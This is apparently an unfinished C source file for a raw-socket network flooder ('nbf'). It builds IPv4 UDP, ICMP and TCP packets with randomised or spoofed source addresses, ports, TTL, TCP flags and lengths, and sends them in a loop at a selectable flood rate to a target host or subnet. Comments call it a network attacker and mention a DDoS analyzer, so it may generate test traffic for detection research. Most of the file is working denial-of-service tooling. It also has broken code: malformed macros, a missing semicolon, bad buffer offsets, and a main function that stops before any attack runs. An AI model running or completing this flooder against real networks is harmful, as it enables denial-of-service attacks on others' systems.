#include<stdio.h>
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<strings.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<sys/un.h>
#include<sys/select.h>
#include<sys/ioctl.h>
#include<sys/stat.h>
#include<sys/wait.h>
#include<linux/if_packet.h>
#include<netinet/in.h>
#include<net/if.h>
#include<net/ethernet.h>
#include<net/if_arp.h>
#include<arpa/inet.h>
#include<ifaddrs.h>
#include<errno.h>
#include"nbf.h"


#define FLOOD_DELAY	5000    //5 milliseconds

#define MAX_DELAY	50000	// 0.5 second delay that would reflect normal traffic
#define MIN_DELAY	100	// 0.1 millisecond

#define MAX_RATE	4
#define HALF_RATE	3
#define QURT_RATE	2
#define MIN_RATE	1

#define MIN_FRAME_LEN	60
#define MIN_UDP_DATALEN	18	//data for eth+ip+udp
#define MIN_DATALEN	MIN_UDP_DATALEN

#define MTU		1514 //that's the max ethernet packet size (maybe add CRC field gives 1516 or something like that)


//flow fields mask constants (except ipversion and l3 proto (and dest addr ?) )
#define FLWMSK_SADDR	0x1
#define FLWMSK_DADDR	0x2
#define FLWMSK_SPORT	0x4
#define FLWMSK_DPORT	0x8



//flow extension fields mask constants
#define FLWXMSK_PKTLEN	0x1
#define FLWXMSK_ICMP4B	0x2
#define FLWXMSK_TCPFLG	0x4
#define FLWXMSK_TCPSEQ	0x8
#define FLWXMSK_TCPACK	0x10
#define FLWXMSK_TCPWIN	0x20
#define FLWXMSK_TCPURG	0x40
#define FLWXMSK_TCPSUM	0x8
#define FLWXMSK_TCPDLEN	0x100

#define FLWXMSK_IPTTL 	0x200
#define FLWXMSK_IPDSCP	0x400
#define FLWXMSK_IPFRAG?
#define FLWXMSK_IPID?
#define FLWXMKS_IPOPT?


unsigned int flood_delay;

unsigned int target_ip, target_net_prefix, target_host_bits;
unsigned int src_ip, src_net_prefix, src_host_bits;

int pktctr = 10;


/*convert a numerical prefix to equivalent subnet mask*/
//returns mask in network byte-order
prfx_to_msk(int prefix_len, char ip_v, int *result) {

	register int mask = 0;

	int bit;

	for(bit = 31; bit > (31 - prefix_len); bit--) {
		mask |= (1 << bit);
	}

	*result = htonl(mask);//must be stored in "struct subnet" in network byte-order

//CHECK IPv6
	
}



set_rate(int rate) {


//MAX: does BYPASS_QDISC increase rate even if some pkts are lost?
//	does the rate increase if we use zero (or close to) delay even if some pkts
	//	are dropped by the kernel?
	//does BYPASS_QDISC prevents pkts being dropped by kernel when using zero (or close to) delay?


	if(rate >= MAX_RATE) {
		flood_delay = MIN_DELAY; //either zero or 1 microsecond
	}
	else
	if(rate == HALF_RATE) {// half speed
		flood_delay = MAX_DELAY / 2; 
	}
	else
	if(rate == QURT_RATE) { //CHECK is this calculated correctly?
		flood_delay = (MAX_DELAY / 4) * 3;
	}
	else //min rate	//this should be normal traffic rate (for the attacked network?)
	flood_delay = MAX_DELAY; //this should reflect the normal traffic rate (minimum speed)

}


int
iface_bind(char *name) {

/*	strcpy(ifr.ifr_name,name);
	if(ioctl(chp->ch_sockd,SIOCGIFINDEX,&ifr) < 0) {//get interface index
		printf("fatal chinit: error getting ifindex:\t%s\n",strerror(errno));
		exit(1);
	}
*/
}


unsigned short
in_chksum(short *pkt,int len){
printf("in chksum enter\n");
        int left = len;
        unsigned int sum = 0;
        unsigned short *w = pkt;
        unsigned short answer = 0;


        while(left>1){
                sum += *w++;
                left-=2;
        }

        if(left == 1){
                *(unsigned char *)(&answer) = *(unsigned char *)w;
                sum+=answer;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;

}

//returns length of options buffer
int 
build_ip_options(char opt_type, char *opt_buff) {

//version 4 or 5:
//the opt_buff is filled either by the caller or internally by this function depending on
//the option type, the memory buffer is allocated by the caller


//HERE: this function is crap just fills options buffer with any values for bruteforcing purposes

/*options still not deprecated:

        .end of option list (type 0)
                .used at the end of list of options to align the header on a 32bit boundary
        .NOP (type 1)
                .used between options to align each option on a 32bit boundary

        *.source route (most used)
                .LSRR 
                .SSRR

        *.Record Route
        *.timestamp
*/

//	i dont think it matters for bruteforce attacks what is inside the options field
//	so we can pretty much fill it with any random bytes


	//NOP will align each option on a 32bit boundary, endoflist at the end of all options for the same purpose
/*
	switch(opt_type) {
                case IPOPT_TSTAMP:
                        //bla;
                break;
                case IPOPT_RR:
                        //blabla;

                        break;
                case IPOPT_LSRR:
                        //blablabla;

                       break;
                case IPOPT_SSRR:
                        //xyzblabla;
                        break;

                default:
			;
        }
*/

	//hack for the bruteforce, will deal with this shit when making proto based attacks
	int opt_len = 0;

	int options;

	//just fill options buffer with random crap for now
	while(opt_len <= 40) {
		options = 0;//random();
	 	memcpy(opt_buff, &options, sizeof(int));
		opt_len += sizeof(int);
	}
	if(opt_len > 40) opt_len = 40;


//	opt_buff[0] = 1;//type
//	opt_buff[1] = 40;//len
//	opt_buff[2] = 3;


// i think fragmentation is irrelevant to options,
                        //or rather the frag_offset field isnt affected by options
                        //but (i think) options might be affected by fragmentation (copied bit)


	return opt_len;
}

//NOTE:ptr to total length since in case of options the sending length will be incremented inside build_ip()
void
build_ip //      rfc 6864 id field

(unsigned char tos, unsigned short ip_datalen, unsigned short id, unsigned short frag_off,
unsigned char ttl, unsigned char proto, iphdr *ip_hdr, unsigned char chksum_flg,
unsigned int src_addr, unsigned int dst_addr, int opt_len) {




	//should include the following checks in ip receiving functions in both sensor and analyzer
	//and also the actual processing of options themselves
	/*if hdr length is less than 20 bytes then malformed
	if equal 20 bytes then normal header with no options
	if longer than 20 bytes then there are options to process
	*/


	ip_hdr->v = 4;
	ip_hdr->hl = 5;

	//a similar conditional needs to be added to handle fragmentation stuff
	if(opt_len != 0) {
	//check for 32bit boundary alignment inside build_ip()
	//and not more than 40
		ip_hdr->hl += (opt_len/4);
	}

//printf("hlen is %d\n",ip_hdr->hl);

	ip_hdr->tlen = htons((ip_hdr->hl << 2) + ip_datalen);
//printf("tlen is %d\n",ntohs(ip_hdr->tlen));

	ip_hdr->tos = tos;

	ip_hdr->id = id;
	ip_hdr->frag_off = 0;
	ip_hdr->ttl = ttl;
	ip_hdr->proto = proto;

	ip_hdr->saddr = htonl(src_addr);
	ip_hdr->daddr = htonl(dst_addr);
	

	ip_hdr->chksum = 0;//i dont understand how is checksum not affected by byte order stuff(because it's wrong both ways
										//all this time i was testing with random chksums)

	//zero -> random checksum (intentionally wrong checksum)
	ip_hdr->chksum = chksum_flg == 0 ? random() & 0xffff : in_chksum(ip_hdr, ip_hdr->hl << 2);

}

void
build_icmp
(char *buf, char type, char code, int icmp_var, char *data_buf, int data_len) {
//type and code, and checksum are fixed, the next 4 bytes are type dependent (icmp variable)

#define ICMP_ECHOREP	0
#define ICMP_ECHO	8
#define ICMP_DSTUNRCH	3
#define ICMP_REDIRECT	5
#define ICMP_RTRADV     9
#define ICMP_RTRSOLCT   10
#define ICMP_TMEXC	11
#define ICMP_PRMPRB	12



//the icmp_variable is filled either by the caller or internally by this function depending on
//the icmp type, the memory buffer is allocated by the caller


//	which fields would affect the flow key and attack signature?
//	for the analyzer we might assume the checksum is correct so we dont have to bother with it right now
//	about the multi valued fields??


	icmphdr *icmp = buf;


	icmp->type = type;
	icmp->code = code;
	icmp->chksum = 0;

	
	
	switch(icmp->type) { //those are more than enough
		case ICMP_ECHO:
			//fill id and sequence
//			icmp->id = 
//			icmp->seq = 
			break;
		case ICMP_ECHOREP:
//			icmp->id = 
//			icmp->seq = 
			break;
		case ICMP_DSTUNRCH:
			//zero out unused four octets
			icmp->id = 0;
			icmp->seq = 0;
			break;
		case ICMP_REDIRECT:
			//fill four octets with gateway internet address
			icmp_var = htonl(icmp_var);
			icmp->id = icmp_var & 0xffff;
			icmp->seq = (icmp_var >> 16);
			break;
		case ICMP_RTRADV:
		case ICMP_RTRSOLCT:
		case ICMP_TMEXC:
			icmp->id = 0;
			icmp->seq = 0;
			break;
		case ICMP_PRMPRB:
		default:
			icmp_var = htonl(icmp_var);
			icmp->id = icmp_var & 0xffff;
			icmp->seq = (icmp_var >> 16);;
	}


	if(data_buf)
		memcpy(icmp->data, data_buf, data_len);
	else
		memset(icmp->data, 'x', 20 + 8);//sizeof(iphdr) + 8


}

void
build_ip6() {

}

void build_icmp6() {

}

void
build_udp
(char *buf, unsigned short sport, unsigned short dport, int datalen, char *data, char cs_flg) {
printf("build udp enter\n");
	udphdr *udp = (udphdr *) buf;

//CHECK
	/*12 bytes udp pseudo header (used only for checksum computation,
	NOT to be sent with the datagram, in the code he writes,udpip points to
	the same location as iphdr,since has all iphdr set to zero except for the 
	ones required for chksum computation, but this prevents isolating 
	the code for building iphdr and the code for building udp hdr*/
	//udpipsaddr
	//udpipdaddr
	//udpipproto (17)
	//udpipulen (udplength)


	udp->sport = htons(sport); 
	udp->dport = htons(dport);
	udp->len = htons(sizeof(udphdr) + datalen);//(udphdr + udpdata) length

	if(data == NULL)
		memcpy(udp + sizeof(udphdr), "X", datalen);//CHECK: this is wrong, it will send followed by datalen-1 bytes of garbage
	else
		memcpy(udp + sizeof(udphdr), data, datalen);

	udp->chksum = cs_flg ? in_chksum(udp, sizeof(udphdr) + datalen) : 0;//length of udphdr + udpdata

printf("build udp end\n");

}

void
build_tcp
(char *buf, unsigned short sport, unsigned short dport, unsigned char flags, char *data_buf, int data_len) {

	tcphdr *tcp = buf;

	tcp->sport = htons(sport);
	tcp->dport = htons(dport);
	tcp->seq = random();//TEMP
	tcp->ack = random();//TEMP
	tcp->off = 5;
	tcp->flags = flags;
	tcp->win = 20; //is this relevant?
	tcp->urgent = 20;//what is that ? is it relevant

	if(data_buf)
		memcpy(tcp + sizeof(tcphdr), data_buf, data_len);
	else
		memset(tcp + sizeof(tcphdr), 'f', data_len);

	tcp->chksum = 0;//hdr only or hdr + data? i think hdr + data like udp and the same for icmp i think

}


/*
 Input: ( arg list or getopt() )

	attack_type
	ipversion
	l3_proto
	interface
	bps/pps
		
*/

void
bruteforce_static(int sock, unsigned char ip_v, unsigned char l3_proto, char ip_option/*or ip6_ext*/) {

	unsigned int send_len = 0, data_len =0, opt_len = 0, ip_datalen = 0;

	int src, dst;


	void *packet = malloc(1500);
	void *dummy = malloc(12);//udp dummy hdr for chksum
	char *opt_buf = malloc(40);

	char *l3_hdr,*l4_hdr;

	int l3_size,l4_size;

//--->> //set packet length

//        data_len = random() %1500;

printf("datalen is %d\n",data_len);


        if(data_len < MIN_UDP_DATALEN)//ethernet frame is at least 14 + 46 = 60 bytes
                data_len = MIN_UDP_DATALEN;

printf("datalen is %d\n",data_len);

        ip_datalen += data_len;

	l3_hdr = packet + ETH_HLEN;

//	if(ip_v == 4)
		l4_hdr = packet + ETH_HLEN + sizeof(iphdr);
//	else
//	if(ip_v == 6)
//		l4_hdr = packet + ETH_HLEN + sizeof(ip6hdr);
//	else
//		exit(0); 



	if(ip_option != 0) {//will deal with ipv6 extensions later (i dont know if they are compatible)
printf("adding ip options\n");
		opt_buf = l4_hdr;
		opt_len = build_ip_options(ip_option, opt_buf);
		l4_hdr += opt_len;
//		send_len += opt_len;
	}

/*NOTE: since i dont want to create many buffers, the building of layer4 hdr takes place after the ip option,
	but for me i prefer if building layer 3 hdr goes into consecutive code statements then layer 4,or vice versa,
	but not have them intertwined like what i did here, to accomplish this just make a distinct buffer for layer 4 hdr
	and construct it, then construct the layer3 header in its distinct buffer, then copy them both with the correct lengths
	into the buffer which will be passed to write(), send() or sendto()
*/
	switch(l3_proto) {
		case IPPROTO_UDP:printf("udp\n");
			build_udp(l4_hdr, random() & 0xffff, random() & 0xffff,
				data_len, NULL, 
				0/*no chksum*/
				/*,NULL*dummy hdr ptr*/);

			ip_datalen += sizeof(udphdr);
			break;
		case IPPROTO_ICMP:printf("icmp\n");
			build_icmp(l4_hdr, random() & 0xff, random() & 0xff, random(), NULL, data_len);
			break;
		case IPPROTO_TCP:printf("tcp\n");
			build_tcp(l4_hdr, random() & 0xffff, random() & 0xffff, random() & 0xff,
				NULL, data_len);
			break;
		default:
		;
        }



        if(ip_v == 4) {
		iphdr ip_hdr;

		dst = target_ip;// probably all packets will have the same destination address

		*(short *)(packet + ETH_ALEN * 2) = htons(ETH_P_IP);

		build_ip(random() & 0xff,	//ToS
			ip_datalen,		//l4_hdr_len + data_len (both represent ip_datalen)
			random() & 0xffff,	//id
			0,			//frag stuff
			random() & 0xff,	//ttl
			l3_proto,
			l3_hdr,
			1,			//0 -> random chksum, correct otherwise
			random(),		//src
			dst,
			opt_len		//to adjust hdrlen, total length and chksum if non zero
			);

		send_len = ETH_HLEN + sizeof(iphdr) + opt_len + ip_datalen;	
	
        }else
	if(ip_v == 6) { printf("ipv6 is unsupported yet\n"); exit(1);

 		//modify for ipv6 inet_pton(AF_INET6) ?
	//	pr_saddr.sin_addr.s_addr = inet_addr(argv[TRGTIP_IDX]);// probably all packets will have the same destination address
	//      pr_saddr.sin_port = htons(argv[DPORT_IDX]);
	//	build_ip6(/*arguments*/);
		
	//	send_len += sizeof(ip6hdr);

        }else{
		printf("wrong ipversion\n");
		exit(1);
	}



	//this is not necessary but just to double check
	if(send_len < MIN_FRAME_LEN)//ethernet frame is at least 14 + 46 = 60 bytes
		send_len = MIN_FRAME_LEN;

printf("sendlen is %d\n",send_len);

//version 2 ->  /*build pkt*/

	int ctr = 10;

	while(ctr--) {printf("inside while loop\n");
		/*send pkt*/
		if( send(sock, packet, send_len, 0) < 0) {
			sleep(1);
		//	continue;
			printf("error while sending pkt: %s",strerror(errno));
			//exit(1);
		}
		usleep(FLOOD_DELAY);
	}

}


void
bruteforce_dynamic
(int sock, char ipv, unsigned char l3proto, char ip_option/*or ip6_ext*/, unsigned short flowkey_mask, unsigned short flowkeyext_mask) {

	unsigned int datalen, max_datalen, opt_len = 0, ip_datalen = 0, send_len, icmp_var;
	unsigned short sport, dport;
	unsigned int saddr, daddr, host_id;
	unsigned char saddr6[16], daddr6[16];

	unsigned char ip_dscp, ip_ttl;
	unsigned short ip_id, ip_frag;

	unsigned char tcp_flags;

	void *packet = malloc(1500);
	void *dummy = malloc(12);//udp dummy hdr for chksum
//char *opt_buf = malloc(40);

        char *l3_hdr, *l4_hdr, *data_buf;

//int l3_size,l4_size;

	
	datalen = MIN_DATALEN;

//TEMP 
	char *dst_mac = "\x00\xe0\x4c\x53\x44\x58";
	char *src_mac = "\x22\x33\x44\x55\x66\xff";

	memcpy(packet, dst_mac, 6);
	memcpy(packet + 6, src_mac, 6);
	

//TEMP

//TEMP

	//fill in the flow key fields 
	
	saddr = src_ip; //random();
	daddr = target_ip;

	sport = random();
	dport = random();


	//l3 additional fields
	ip_dscp = random() & 0xff;	   //ToS
	ip_id = random() & 0xffff;   //id (should it be zero for non fragmented pkts? CHECK RFC 791)
	ip_frag = 0; //or random?     //frag stuff
	ip_ttl = random() & 0xff;  //ttl

	//l4 flow ext. fields
	icmp_var = 0;
	tcp_flags = 0;

//END TEMP




        l3_hdr = packet + ETH_HLEN;

//      if(ip_v == 4)
                l4_hdr = packet + ETH_HLEN + sizeof(iphdr);
//      else
//      if(ip_v == 6)
//              l4_hdr = packet + ETH_HLEN + sizeof(ip6hdr);
//      else
//              exit(0);



	max_datalen = MTU - ETH_HLEN;

	/*
	 * A lot of hastle for the max datalength
	 * I could have just left a safety margin
	 * and hardcode any number
	 */
	if(ipv == 4) max_datalen -= sizeof(iphdr);
	else max_datalen -= sizeof(ip6hdr);

	if(l3proto == IPPROTO_ICMP) max_datalen -= sizeof(icmphdr);
	else
	if(l3proto == IPPROTO_UDP) max_datalen -= sizeof(udphdr);
	else max_datalen -= sizeof(tcphdr); //even if not tcp, it has the longest l4 hdr (i think)

	 printf("max data length %d\n",max_datalen);

	data_buf = malloc(max_datalen);

//	get_l57_hdr();


	//1.randomly assign values that are not assigned by user( huh?)

	while(pktctr-- != 0) {

	//to substitute the functionality of bruteforce_static()
	//	if mask is zero go to building functions directly
//later	-->>	if mask is zero go to sending directly (no need to rebuild the same packet)
	

		//2.are there any fields that should be changed?
		//change the ones that do


//		we want to randomize the host part of the address,
		if( flowkey_mask & FLWMSK_DADDR) {
			if(ipv == 4) { printf("target_net_prefix: %x, target host_bits: %x\n",target_net_prefix,target_host_bits);
				daddr = target_host_bits & random();printf("daddr is %x\n",daddr);
				daddr |= target_net_prefix;
				printf("daddr is %x\n", daddr);
			}else
			if(ipv == 6) {
			}else exit(1);//it really wouldnt have made it this far
		}

		if( flowkey_mask & FLWMSK_SADDR ) {
			if(ipv == 4) { printf("src net_prefix: %x, src host_bits: %x\n",src_net_prefix,src_host_bits);
                                saddr = src_host_bits & random();printf("saddr is %x\n",saddr);
                                saddr |= src_net_prefix;
                                printf("saddr is %x\n", saddr);
                        }else
                        if(ipv == 6) {
				//saddr6[1-4] = random(); 
                                //saddr6[5-8] = random();
                                //saddr6[9-12] = random();
                                //saddr6[13-16] = random();
                        }else exit(1);//it really wouldnt have made it this far
		}

		if( flowkey_mask & FLWMSK_SPORT ) {printf("changing src port\n");
			sport = random() & 0xffff;
		}

		if( flowkey_mask & FLWMSK_DPORT ) {
			dport = random() & 0xffff;
		}

		if( flowkeyext_mask & FLWXMSK_PKTLEN ) {
			//change data length to change pkt length
			//make sure pkt is not less than minimum
                        //make sure pkt is not more than maximum

			
			do datalen = random() % (MTU + 1);
			while( datalen < MIN_DATALEN || datalen > max_datalen );

			char crap = random() & 0xff;
			memset( data_buf, crap , datalen);
		}

	//IPv4
		if( flowkeyext_mask & FLWXMSK_IPDSCP ) {
			ip_dscp = random() & 0xff;
		}

		if( flowkeyext_mask & FLWXMSK_IPTTL ) {
			ip_ttl = random() & 0xff;
		}


	//ICMP
		if( flowkeyext_mask & FLWXMSK_ICMP4B ) {
			//change whatever is in the 4 bytes,
				//after the icmp checksum
			icmp_var = random();
		}

	//TCP
		if( flowkeyext_mask & FLWXMSK_TCPFLG ) {
			tcp_flags = random() & 0xff;
		}

//		if( flowkeyext_mask & FLWXMSK_TCPSEQ )


//		if( flowkeyext_mask & FLWXMSK_TCPACK )


//		if( flowkeyext_mask & FLWXMSK_TCPWIN )


//		if( flowkeyext_mask & FLWXMSK_TCPURG )



//DATALEN (the field)

                //if( flowkeyext_mask & FLWXMSK_UDPDLEN )
                        //change the datalen field without actually changing
                                //the length of the following data?
                        //or more accurately stated: make the datalen field
                                //intentionally wrong?


                //if( flowkeyext_mask & FLXMSK_TCPDLEN )
//END DATALEN


//CHECKSUM ??
		//if( flowkeyext_mask & FLWXMSK_TCPSUM )

		//if( flowkeyext_mask & FLWXMSK_UDPSUM )

		//if( flowkeyext_mask & FLWXMSK_ICMPSUM )
//END CHECKSUM

		ip_datalen = 0;
		ip_datalen += datalen;

		//3.now build the packet headers and data portion





	//the following is copied verbatim (until now) from bruteforce_static()
	//i may modify, remove or add some parts as i deem necessary for the purpose this network attacker

/* comment out options for now
        if(ip_option != 0) {//will deal with ipv6 extensions later (i dont know if they are compatible)
printf("adding ip options\n");
                opt_buf = l4_hdr;
                opt_len = build_ip_options(ip_option, opt_buf);
                l4_hdr += opt_len;
//              send_len += opt_len;
        }
*/
/*NOTE: since i dont want to create many buffers, the building of layer4 hdr takes place after the ip option,
        but for me i prefer if building layer 3 hdr goes into consecutive code statements then layer 4,or vice versa,
        but not have them intertwined like what i did here, to accomplish this just make a distinct buffer for layer 4 hdr
        and construct it, then construct the layer3 header in its distinct buffer, then copy them both with the correct lengths
        into the buffer which will be passed to write(), send() or sendto()
*/

		//build l4 header
                switch(l3proto) {
                case IPPROTO_UDP:printf("udp\n");
                        build_udp(l4_hdr,
				sport, dport,
                                datalen, NULL, //data_buf,
                                0/*no chksum*/
                                );
                        ip_datalen += sizeof(udphdr);
                        break;
                case IPPROTO_ICMP:printf("icmp\n");
                        build_icmp(l4_hdr,
				sport & 0xff,
				(sport >> 8) & 0xff,
				icmp_var, NULL, datalen);
                        ip_datalen += sizeof(icmphdr);
                        break;
                case IPPROTO_TCP:printf("tcp: flags %d\n",tcp_flags);
                        build_tcp(l4_hdr,
				sport, dport,
				tcp_flags, NULL, datalen);
                        ip_datalen += sizeof(tcphdr);
                        break;
                default:
                ;
		}


		if(ipv == 4) {

                *(short *)(packet + ETH_ALEN * 2) = htons(ETH_P_IP);

                build_ip(ip_dscp,       //ToS
                        ip_datalen,             //l4_hdr_len + data_len (both represent ip_datalen)
                        ip_id,		//id
                        ip_frag,	//frag stuff
                        ip_ttl,		//ttl
                        l3proto,
                        l3_hdr,
			1,		//checksum (0 random, otherwise compute)
			saddr,		//src
			daddr,
                        opt_len		//to adjust hdrlen, total length and chksum if non zero
                        );

                send_len = ETH_HLEN + sizeof(iphdr) + opt_len + ip_datalen;

        }else
        if(ipv == 6) { printf("ipv6 is unsupported yet\n"); exit(1);

                //modify for ipv6 inet_pton(AF_INET6) ?
        //      pr_saddr.sin_addr.s_addr = inet_addr(argv[TRGTIP_IDX]);// probably all packets will have the same destination address
        //      pr_saddr.sin_port = htons(argv[DPORT_IDX]);
        //      build_ip6(/*arguments*/);

        //      send_len = ETH_HLEN + sizeof(ip6hdr) + opt_len + ip_datalen;

        }else{
                printf("wrong ipversion\n");
                exit(1);
        }

		//send the built packet
	printf("send_len is %d\n",send_len);
		/*send pkt*/
                if( send(sock, packet, send_len, 0) < 0) {
                        sleep(1);
                //      continue;
                        printf("error while sending pkt: %s",strerror(errno));
                        //exit(1);
                }

		if(usleep(flood_delay) != 0) printf("usleep error: %s\n",strerror(errno)); 

	}

}

/*
bruteforce_staticx2(int sock, ipv, l3proto, options, /flowkey_mask,/ flowkeyext_mask) {

        int data_len;
        unsigned short sport, dport;
        unsigned int saddr,daddr;
        unsigned char saddr6[16], daddr[16];


        //1.randomly assign values that are not assigned by user



        while() {

                //2.are there any fields that should be changed?
                //change the ones that do

		METHOD2:
		instead of calling the building functions for every iteration,
		just keep an offset of the field that should be changed either
		from the beginning of the packet or from l3 hdr start or l4 hdr start
		and the size of this field, then assign new value to its location in the packet buffer
		then send the packet

		this method might be a little more difficult to implement but its faster
		since it avoids:
				1.calling the functions and returning repeatedly
				2.reassigning fields that dont need to change with the same
					values already assigned to them

		if we redefine packet building functions as function like macros, then we eliminate the
		first performance problem, but it doesnt remove the second one, even though the first problem
		is more responsible for performance degradation, nevertheless, the reassigning thing doesn't feel
		efficient to me,

		however the performance of the first approach might not be a problem for my intended purposes
		but METHOD2 might be used somewhere else for traffic normalization or constructing/modfiying existing packets by 
		DDoS-PS analyzer complex
		
        //data and data len stuff

        //l4 header
        switch(l3proto) {
                case IPPROTO_UDP:
                        bla
                        break;
                case IPPROTO_ICMP:
                        blabla
                        break;
                case IPPROTO_TCP:
                        terara
                        break;
                default:
                        ;
        }


        //l3 header
        if(ipv == 4) {

        }else
        if(ipv == 6) {
        }
        else {
                NA
        }


        //send the built packet

        }
}
*/

//bruteforce_dynamic() {}



/*HERE 1: ip options probably wont make a lot of difference for bruteforce attacks, they will only
        differ in the signatures collected by the analyzer, packet size, the option itself,
        perhaps even similarity in recorded ip addresses in source routing , record routing and timestamp options
*/

//        the same for fragmentation

//      and identification ?? (check rfc 6864)

/*
--->>>  we dont need intelligent/clever bruteforce attacks at this point, maybe after finishing bruteforce then proto based,
        then combining them both to make clever bruteforce attacks
*/





int
usage() {


        printf("usage: ./nbf attack_code -i=iface_name -v=ipversion -x=target_addr [-n=target_net_prefix] -p=l3_proto [-c:src_addr]\n"
		"[-m=src_net_prefix] [-s:sport_dyn] [-d:dport_dyn] [-q:dscp_dyn] [-t:ttl_dyn] [-l:pktlen_dyn] [-b:icmp4b_dyn]\n"
		"[-f:tcpflags_dyn]\n");
		//"// [-o=ip_option] speed(?)\n");
        return 0;
}

#define MINARGC         5

#define ATKCODE_IDX     1

/*
#define IPVER_IDX       2

#define TRGTIP_IDX      3
#define PROTO_IDX       4
#define IPOPT_IDX	6

#define IFNAME_IDX      5
#define RATE_IDX        7
*/


int
main(int argc, char *argv[]) {


	int atk_code, opt;
	unsigned char ipv, l3proto, rate;
	unsigned int flowmask, flowxmask;
	unsigned int prefix, mask;
	char ip_option;// 0 (none), -1 (random) , anything else is the option type as specified in the standard

	char interface[20];

	char *buf = (char *) malloc(1500);
	memset(buf, '\0', 1500);

	int sock, len;
//printf("buf is %p\n",buf);

	struct sockaddr_ll saddr;



	if(argc < MINARGC) {
		usage();
		exit(1);
	}	

atk_code = atoi(argv[ATKCODE_IDX]);

	//set mask according to options
	flowmask = 0;
	flowxmask = 0; //TEMP


	rate = MIN_RATE;

	//get options
	//for ipversion,l3proto and target? an argument is expected
	//for others if specified then they are dynamic, if not then static
	while( (opt = getopt(argc, argv, "i:v:p:x:n:c:m:sdqltbfz:r:")) != -1 ) {
		switch(opt) {
		case 'i': //interface
			strcpy(interface, optarg);
			break;
		case 'v'://ip version
			ipv = atoi(optarg);
			if(ipv !=4 && ipv != 6) {
				printf("bad ip version:%d\n exiting\n",ipv);
				exit(1);
			}
			break;
		case 'p'://ip protocol
			l3proto = atoi(optarg);
			break;
		case 'x'://target (dest address)
			if(ipv == 4) {
				target_ip = inet_addr(optarg);
				target_ip = ntohl(target_ip);
			}else
			if(ipv == 6) {
				printf("ip version 6 is currently not supported\nexiting\n");
				exit(1);
			}else {
				printf("bad ip version\nexiting\n");
				exit(1);
			}
			break;
		case 'n'://target network prefix
			prefix = atoi(optarg);
			if(ipv == 4) {
				if(prefix < 0 || prefix > 32) {
					printf("invalid network prefix for ipv4\nexiting\n");
					exit(1);
				}
				prfx_to_msk(prefix, 4, &mask);
				mask = ntohl(mask);
				target_net_prefix = target_ip & mask;
				target_host_bits = ~mask;
				if(target_net_prefix != 0xffffffff) flowmask |= FLWMSK_DADDR;//will still work correctly without this stmt.
				printf("mask: %x, target netprefix: %x, target hostbits: %x\n",mask, target_net_prefix, target_host_bits);
			}else
			if(ipv == 6) {
				if(prefix < 0 || prefix > 128) {
					printf("invalid network prefix for ipv6\nexiting\n");
					exit(1);
				}
			}else {
				printf("invalid ip version\nexiting\n");
				exit(1);
			}
			break;
		//set the following to dynamic if present in options
		case 'c'://"client" -> src address
		printf("option c\n");
			if(ipv == 4) {
				src_ip = inet_addr(optarg);
				src_ip = ntohl(src_ip);
			}else
			if(ipv == 6) {
				printf("ip version 6 is currently not supported\nexiting\n");
				exit(1);
			}else {
				printf("bad ip version\nexiting\n");
				exit(1);
			}
			break;
		case 'm':
			prefix = atoi(optarg);
			if(ipv == 4) {
				if(prefix < 0 || prefix > 32) {
					printf("invalid network prefix for ipv4\nexiting\n");
					exit(1);
				}
				prfx_to_msk(prefix, 4, &mask);
				mask = ntohl(mask);
				src_net_prefix = src_ip & mask;
				src_host_bits = ~mask;
				if(src_net_prefix != 0xffffffff) flowmask |= FLWMSK_SADDR;
				printf("mask: %x, src netprefix: %x, src hostbits: %x\n",mask, src_net_prefix, src_host_bits);
                        }else
                        if(ipv == 6) {
                                if(prefix < 0 || prefix > 128) {
                                        printf("invalid network prefix for ipv6\nexiting\n");
                                        exit(1);
                                }
                        }else {
                                printf("invalid ip version\nexiting\n");
                                exit(1);
                        }
			break;
		case 's'://src port
		printf("option s\n");
			flowmask |= FLWMSK_SPORT;
			break;
		case 'd'://dst ports
		printf("option d\n");
			flowmask |= FLWMSK_DPORT;
			break;
		case 'q'://dscp
		printf("option q\n");
			flowxmask |= FLWXMSK_IPDSCP;
			break;
		case 't'://ttl
		printf("option m\n");
			flowxmask |= FLWXMSK_IPTTL;
			break;
		case 'l'://pktlen
		printf("option l\n");
			flowxmask |= FLWXMSK_PKTLEN;
			break;
		case 'b'://icmp4b
		printf("option b\n");
			flowxmask |= FLWXMSK_ICMP4B;
			break;
		case 'f'://tcpflags
		printf("option f\n");
			flowxmask |= FLWXMSK_TCPFLG;
			break;
		case 'z':
			pktctr = atoi(optarg);
			break;
		case 'r':
                        rate = atoi(optarg);
                        break;
		default:
			printf("unsupported option: %c\n", opt)
			;
		}

	}



//	if(argv[IPOPT_IDX]) {//this conditional is correct on the premise that cmd line strings are initialized to NULL
//		ip_option = atoi(argv[IPOPT_IDX]);
//		printf("option arg assigned\n");
//	}else
//		ip_option = 0;//default to none (or random?)


	//if(argv[PKTCTR_IDX]) {
	//	pktctr = atoi(argv[PKTCTR_IDX]);
	//}else
		//pktctr = 10;



	/*determine attack type*/
	switch(atk_code) {
		case 1:
		case 2:
			break;
		default:
			printf("unsupported attack code number\n");
			exit(1);
	}

	//set speed/rate
	set_rate(rate);





	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	memset(&saddr, 0, sizeof(saddr));

	if( (sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) ) < 0 ) {
		printf("fatal socket():%s\n",strerror(errno));
		exit(1);
	}

        strcpy(ifr.ifr_name, interface);
	if( ioctl(sock, SIOCGIFINDEX, &ifr) < 0 ) {//get interface index
		printf("fatal chinit: error getting ifindex:\t%s\n",strerror(errno));
		exit(1);
	}

	saddr.sll_ifindex = ifr.ifr_ifindex;

//	if( ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
//		printf("error getting hwaddr of interface: %s\n" , strerror(errno));
//		exit(1);
//	}

	saddr.sll_family = AF_PACKET;
	saddr.sll_protocol = htons(ETH_P_ALL);//does this matter if we are only sending?

//	saddr.sll_hatype = ntohs(ARPHRD_ETHER);
//	saddr.sll_halen = ETH_ALEN;
//	memcpy(&saddr.sll_addr, "\x00\xe0\x4c\x53\x44\x58", saddr.sll_halen);

	if( bind(sock,(struct sockaddr *)&saddr,sizeof(saddr)) < 0) {
		printf("failed to bind socket and address: %s\n",strerror(errno));
		exit(1);
	}


//	int optval = 1;
//	setsockopt(sock, SOL_PACKET, PACKET_QDISC_BYPASS, &optval, sizeof(optval));

